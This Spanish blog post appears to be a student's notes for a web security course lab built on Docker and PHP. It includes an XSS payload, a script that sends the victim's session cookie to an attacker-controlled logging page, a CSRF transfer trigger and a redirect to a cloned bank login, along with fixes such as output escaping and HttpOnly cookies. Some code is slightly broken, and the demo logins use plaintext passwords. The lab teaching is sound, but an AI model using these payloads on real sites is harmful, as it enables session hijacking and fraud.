---
typora-copy-images-to: ../myassets/img
typora-root-url: ../
layout: post
title:  "Validacion de entradas"
date:   2021-03-01 21:50:01 +0100
categories: PePS
---

       Diego Camañ                         Google Cloud                            PePS   

#                                                                                       SEGURIDAD WEB I



Como vamos a utilizar GitHub para gestionar cambios en los ficheros creamos en local la carpeta *validacion*

Y la metemos en GitHub

```
echo "# validacion" >> README.md
git init
git add README.md
git commit -m "first commit"
git branch -M main
git remote add origin https://github.com/dicabel/validacion.git
git push -u origin main
```

Buscamos “docker apache php”, una vez localizado lo instalamos

```
sudo docker pull php
```

 Siguiendo las intruccuiones de  https://hub.docker.com/_/php

creamos el fichero Dockerfile

```
FROM php:7.4-cli
COPY . /usr/src/miapp
WORKDIR /usr/src/miapp
CMD [ "php", "./post.php" 
```

Incluyendo en post.php lo siguiente:

```
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>

<?php
if ($_SERVER['REQUEST_METHOD'] == "GET") {
?>
<p>Nuevo Post</p>
<form action='post.php' method='post'>
	<textarea name="textarea" rows="10" cols="50">Escribe algo aquí</textarea>
	<input type = 'submit' value='enviar'>
</form>
<?php
}else
	echo $_POST["textarea"] ?? "";
?>
</body>
</html>
```





Subimos los cambios a GitHub

```
git add .
git commit -m "primer post.php"
```



Construímos del docker

```
sudo docker build -t mi-php-app .
```

y lo ejecutamos

```
sudo docker run -it --rm -p 8080:80 --name webgood mi-php-app
```

```
Al ejecutarlo en el navegador si introducimos en el formulario

```

```
<script>alert('hackeado')</script>
```



Vemos que se ejecuta el script de "hackeado"



Para mitigar XSS cambiaremos nuestro `post.php`

```
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>

<?php
if ($_SERVER['REQUEST_METHOD'] == "GET") {
?>
<p>Nuevo Post</p>
<form action='post.php' method='post'>
	<textarea name="textarea" rows="10" cols="50">Escribe algo aquí</textarea>
	<input type = 'submit' value='enviar'>
</form>
<?php
}else
	echo htmlspecialchars($_POST["textarea"]) ?? "";
?>
</html>
```

de esta forma al introducir un script el código se convierte en simple texto



# SESIONES

Ejemplo de `login.php`

```
<?php
session_start();

//En una aplicación real, los usuarios estarían almaenados en la base de datos
$all_users = array ("mario" => "qwerty", "juan" => "123456");
$valid_users = array_keys($all_users);

$ya_registrado = $_SESSION['ya_registrado'] ?? false;


if ($_SERVER['REQUEST_METHOD'] == "POST" && !$ya_registrado){
	$usuario = $_POST['usuario'] ?? "";
	$password = $_POST['password'] ?? "";
    
	$ya_registrado = (in_array($usuario, $valid_users)) && ($password == $all_users[$usuario]);
	if ($ya_registrado){
		$_SESSION['ya_registrado'] = true;
		$_SESSION['usuario'] = $usuario;
	}
}

if ($ya_registrado){
	// Si llega aqui es porque es un usuario válido.
	echo "<p>Welcome " . $_SESSION['usuario'] . "</p>";
	echo "<p>Congratulations, you are into the system.</p>";
}else{
?>
	
	<form action='login.php' method='post'>
		Usuario: <input type='text' name = "usuario" id="usuario" value=""><br>
		Contraseña: <input type='password' name = "password" id = "password" value=""><br>
		<input type='submit' value='Enviar'>
	</form>
<?php
}
?>
```



## Robo de sesión

Creamos dos Dockers, uno como el atacante (evil) y otro como víctima (good)

En evil crearemos `robo-de-sesion.php`

```
<?php
$session_robada = $_GET['session_robada'] ?? "";
$session_robada .= "\n";
$fichero = 'sessions.txt';
// Abre el fichero para obtener el contenido existente
$actual = file_get_contents($fichero);
// Escribe el contenido al fichero
file_put_contents($fichero, $session_robada, FILE_APPEND);
```

y en good el atacante habrá conseguido introducir `hackeada.php`donde enviará la cookie de la víctima al atacante

```
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>
    Esta es una página que ha sido hackeada mediante XSS.
Al acceder, envía la cookie de sesión al sitio http://evil.local 
o a http://127.0.0.1:8087/
<img src='http://127.0.0.1:8088/public_html/transfer.php?quantity=1000&user=juan'>

<script>
var c = document.cookie.replace(/(?:(?:^|.*;\s*)PHPSESSID\s*\=\s*([^;]*).*$)|^.*$/, "$1")
var myImage = new Image(1,1);
myImage.src = "http://127.0.0.1:8087/public_html/robar-session.php?session_robada=" + c;
</script>
</body>
</html>
```

Si la víctima después de validarse ejecuta `hackeada.php`

el atacante puede cambiar el valor de `PHPSESSID`en la página de `login.php`con la cookie robada y suplantar al usuario legítimo.

Para evitar este robo de sesión podemos utilizar la cabecera `HttpOnly`y asegurarnos de que solo se envien cookies sobre conexiones seguras.

Modificando el inicio de `login.php`con



```
<?php
ini_set( 'session.cookie_httponly', 1 );
session_start();
```

lograremos que al visitar `hackeada.php`por parte de la víctima no envie la cookie al atacante.



## Fijación de Sesión

Si el atacante logra que la víctima viste su página de login con un identificador de sesión incluido en la url (mediante un emal por ejemplo) podrá acceder como si hubiera sido él mismo el que ha entrado, pues tienen acceso a la cookie. 

Esto se puede evitar si la cookie de sesión es diferente a la cokkie de cuando no ha iniciado sesión. 

Otra mejora es que las cookies expiren en un plazo determinado, lo que provocará el cierre de la sesión. Finalmente es muy importante que en cualquier cambio del perfil del usuario se piden de nuevo sus credenciales, para corroborar que el usuario es el legítimo.



## Control de acceso

El principio de mínimo privilegio debe regir la configuración por defecto en nuestra organización. A partir de ella iremos ampliando permisos y privilegios intentando y resvisando que sean los mínimos e indispensables.

Es típico utilizar roles asociados. Podemos modificar `login.php`para intentarlo.

```
<?php
session_start();

//En una aplicación real, los usuarios estarían almacenados en la base de datos y la contraseña estaría encriptada, como veremos más adelante
$all_users = array ("mario" => ["qwerty", "ADMIN"], "juan" => ["123456", "USER"]);
$valid_users = array_keys($all_users);

$ya_registrado = $_SESSION['ya_registrado'] ?? false;

if ($_SERVER['REQUEST_METHOD'] == "POST" && !$ya_registrado){
	$usuario = $_POST['usuario'] ?? "";
	$password = $_POST['password'] ?? "";

	$passwordUsuario = $all_users[$usuario][0];
	$rolUsuario = $all_users[$usuario][1];
	
	$ya_registrado = (in_array($usuario, $valid_users)) && ($password == $passwordUsuario);
	if ($ya_registrado){
		$_SESSION['ya_registrado'] = true;
		$_SESSION['usuario'] = $usuario;
		$_SESSION['ROL'] = $rolUsuario;
	}else{
        echo "Usuario no encontrado";
    }	
}

if ($ya_registrado){
	// Si llega aqui es porque es un usuario válido.
	echo "<p>Welcome " . $_SESSION['usuario'] . "</p>";
	echo "<p>Congratulations, you are into the system.</p>";
}else{
?>
	
	<form action='login.php' method='post'>
		Usuario: <input type='text' name = "usuario" id="usuario" value=""><br>
		Contraseña: <input type='password' name = "password" id = "password" value=""><br>
		<input type='submit' value='Enviar'>
	</form>
<?php
}
?>
```

Y las tres páginas de validación de roles

`perfil.php`

```
<?php
session_start();
if (!$_SESSION['ya_registrado']){
	header('Location: login.php');
}
if ($_SESSION['ROL'] != "USER"){
	header('Location: no-autorizado.php');
}
?>
<h1>Página de perfil del usuario.</h1>
```



`admin.php`

```
<?php
session_start();
if (!$_SESSION['ya_registrado']){
	header('Location: login.php');
}
if ($_SESSION['ROL'] != "ADMIN"){
	header('Location: no-autorizado.php');
}
?>
<h1>Página de administración del sitio</h1>
```

y la de `no-autorizado.php`

```
<?php
session_start();
?>
<h1>Acceso no autorizado</h1>
```

Realizamos diferentes pruebas. Primer nos validamos como Mario

![validacion1 welcome mario](/myassets/img/validacion1 welcome mario.png)

y comprobamos que pasa si entramos como`admin.php`

![validacion1  mario admin autorizado](/myassets/img/validacion1  mario admin autorizado.png)

 y como perfil `no-autorizado.php`



![validacion1  mario perfil no autorizado](/G:/Mi unidad/PePS/Validacion/validacion1  mario perfil no autorizado.png)

lo mismo para Juan

![validacion2 welcome juan](/myassets/img/validacion2 welcome juan.png)



![validacion2 perfil usuario juan](/myassets/img/validacion2 perfil usuario juan-1615934527136.png)



![validacion2 admin no autorizado juan](/myassets/img/validacion2 admin no autorizado juan.png)

Comprobamos también que `login.php`funciona para los usuarios que no existen

![validacion3 usuario no encontrado pepe](/myassets/img/validacion3 usuario no encontrado pepe.png)

## Cross Site Request Forgery (CSRF)



El atacante necesita que la víctima envie una solicitud a una página a la que esta última tiene privilegios de forma que le favorezca, es decir, que la victima realice una acción que desea el atacante.

Suponiendo que el atacante consigue que la victima acceda a `hackeada-csrf.html`

```
Esta es una página que ha sido hackeada mediante XSS.
Al acceder, realiza una transferencia de 1000 € al atacante.
<img src='http://127.0.0.1/transfer.php?quantity=1000&to=juan'>
```

y conoce el funcionamiento de `transfer.php`de tal forma que le pasa los parámetros que le interesan para aceptar el dinero de la víctima podrá transferir en este caso el dinero de la víctima al atacante (Juan).

El código de `transfer.php`podría ser

```
<?php
session_start();
if (!$_SESSION['ya_registrado']){
	header('Location: login.php');
}
$from = $_SESSION['usuario'];
$to = $_GET['to'];
$quantity = $_GET['quantity'];
//Este código es una simplificación 
$BD = "Transferencia realizada de $from a $to; cantidad: $quantity";
$fichero = 'transfers.txt';
// Abre el fichero para obtener el contenido existente
$actual = file_get_contents($fichero);
// Escribe el contenido al fichero
file_put_contents($fichero, $BD, FILE_APPEND);
```





![validacion4 transfer](/myassets/img/validacion4 transfer.png)

## Redirigir a otra web

XSS también incluye la redirección a un página controlada por el atacante

`hackeada-redirect.html`

```
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>
    Esta es una página que ha sido hackeada mediante XSS.
Al acceder, reenvía al visitante a una página controlada por un hacker
<script>document.location = 'http://127.0.0.1:8087/public_html/clon-de-mi-banco.html'</script>
</body> 
```

Cuando la víctima accede a la página de arriba es redireccionado a una página controlada por el atacante

![validacion5 hackeada en evil](/myassets/img/validacion5 hackeada en evil.png)![validacion5 hackeada-redirect en good](/myassets/img/validacion5 hackeada-redirect en good.png)

`clon-de-mi-banco.html`

```
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>
<p>Esta página es un clon de la página de login de mi banco. Cuando el usuario realiza un login, los datos de conexíón son capturados por el atacante.</p>
<p>Otra posibilidad es que desde esta página se instale un malware en el ordenador</p>
<p>Las posibilidades son infinitas...</p>
</body>
</html>
```

